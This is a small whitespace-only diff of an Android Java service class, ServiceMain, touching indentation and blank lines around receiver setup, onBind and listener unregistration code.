@@ -37,7 +37,7 @@ public class ServiceMain extends Service {
 
     public long mersenne;
 
-    @Override
+	@Override
     public IBinder onBind(Intent intent) {
         return null;
     }
@@ -79,7 +79,6 @@ public class ServiceMain extends Service {
         bc = new BC();
 	    // Wifi
         wr = new WR();
-
         if (Cfg.DEBUG) {
             Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
         }
@@ -236,6 +235,7 @@ public class ServiceMain extends Service {
 
             ListenerProcess.self().unregister();
 			listenersRegistered = false;
+
 		}else{
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (skipping already unregistered)");
